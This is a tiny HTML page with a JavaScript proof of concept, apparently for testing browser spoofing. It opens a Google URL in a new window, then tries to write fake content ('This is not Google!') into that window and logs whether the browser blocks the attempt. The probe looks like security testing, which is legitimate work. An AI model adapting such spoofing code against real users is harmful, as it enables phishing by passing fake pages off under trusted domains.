<!DOCTYPE html>
<html>
<body>
  <button onclick="spoof()">Click to spoof</button>

  <script>
    function spoof() {
      let win = window.open("https://www.google.com/csi", "_blank");
      
      setTimeout(() => {
        try {
          win.document.write(`<h1>This is not Google!</h1>`);
          win.document.close();
          console.log("✅ SUCCESS - Injection worked!");
        } catch (e) {
          console.warn("❌ BLOCKED:", e.message);
          // Cek apa masih bisa akses win
          console.log("Window still accessible?", !!win);
          console.log("Window location:", win.location.href);
        }
      }, 50);
    }
  </script>
</body>
</html>
